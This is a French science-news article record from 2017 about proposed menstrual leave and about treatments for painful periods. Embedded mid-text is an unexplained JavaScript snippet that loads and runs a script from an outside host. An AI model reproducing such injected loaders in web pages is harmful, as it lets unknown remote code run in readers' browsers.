{"title": "Conge menstruel : les femmes pas toutes egales face aux regles", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-09-01", "content": "L'Italie pourrait mettre en place un conge menstruel pour les femmes qui ont des regles douloureuses, comme le font deja certains pays asiatiques. De nombreuses femmes souffrent tous les mois de ces douleurs. Des medicaments ou des therapies alternatives peuvent apporter des solutions.  Ce qu'il faut retenir Certains pays dans le monde ont mis en place un conge menstruel pour les femmes souffrant de regles douloureuses. Les douleurs des regles sont frequentes chez les femmes et les adolescentes. Elles peuvent souvent etre soulagees par des anti-inflammatoires non steroidiens. En mars 2017, l'Italie etudiait un projet de loi visant a instaurer un conge menstruel pour les femmes sujettes aux  regles  douloureuses. En Zambie, le pays a autorise en janvier un jour de conge par mois pour les femmes qui rencontrent ce probleme. Le conge menstruel existe aussi dans plusieurs pays asiatiques comme le Japon. En France, le debat est lance. Certains craignent qu'un tel conge ne soit pas forcement une bonne chose pour les droits des femmes, car elles pourraient subir encore plus de discriminations au travail. Au-dela du debat societal, c'est l'occasion de rappeler ce que sont les regles douloureuses, leurs causes possibles et les traitements existants. Les regles douloureuses ( dysmenorrhee ) sont frequentes chez les femmes et, heureusement, souvent sans  gravite , mais elles impactent la qualite de vie. D'apres l' assurance maladie , plus de la moitie des adolescentes seraient concernees ; ces douleurs des premieres regles peuvent alors s'estomper avec le temps. Mais les douleurs reapparaissent souvent chez les femmes adultes ; chez elles, une dysmenorrhee est parfois le signe d'une  pathologie  :  endometriose , fibrome uterin,  kyste , infection...  Les douleurs des regles durent en general un ou deux jours, en particulier le jour ou le saignement est le plus important. Elles touchent le bas ventre (avec par exemple des crampes, spasmes), voire le  dos , les cuisses. D'autres  symptomes  sont possibles : nausees, vomissements,  migraine ,  fatigue ,  diarrhee ... La contraception hormonale peut aider a calmer les douleurs des regles, voire supprimer les regles. (c) farland9, Fotolia                               Des solutions de traitements contre les regles douloureuses Un  anti-inflammatoire non steroidien  peut calmer les douleurs des regles car ces medicaments limitent les contractions douloureuses de l' uterus . De plus, une  contraception  hormonale peut apporter une solution aux problemes de dysmenorrhee, car les regles sont generalement moins abondantes et les contractions moins fortes avec la pilule. Certains contraceptifs peuvent meme arreter les regles.   ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Voir aussi : La pilule contraceptive combinee attenue les douleurs dues aux regles Si les traitements ne calment pas la douleur, il faut consulter un medecin. De la meme facon, des douleurs qui se prolongent sur plusieurs jours, avant et apres les regles, des saignements entre les regles ou des regles tres abondantes doivent inciter a voir un medecin. Si ce dernier soupconne une pathologie responsable des regles douloureuses, une  echographie  peut etre realisee. Des solutions plus naturelles peuvent aussi aider a soulager les douleurs des regles. Ainsi, l' acupuncture  semble efficace, comme l'a montre une  revue de litterature de 2011  qui s'est interessee a six etudes incluant 673 femmes. D'apres ces travaux, l'acupuncture reduisait la douleur, par rapport a un  placebo , des anti-inflammatoires non steroidiens ou des plantes chinoises. D'apres une autre  etude parue en 2014 , la  chaleur , par exemple avec un coussin chaud sur le ventre, soulagerait aussi les douleurs des regles.  L'arbre antidouleur d'Afrique                       Le neurobiologiste Michel de Waard raconte comment avec son equipe ils ont decouvert qu'une plante medicinale, le pecher africain, contenait de fortes doses de tramadol, un antidouleur de synthese sur le marche depuis 40 ans. (c) Inserm                                       ", "theme": "sante"}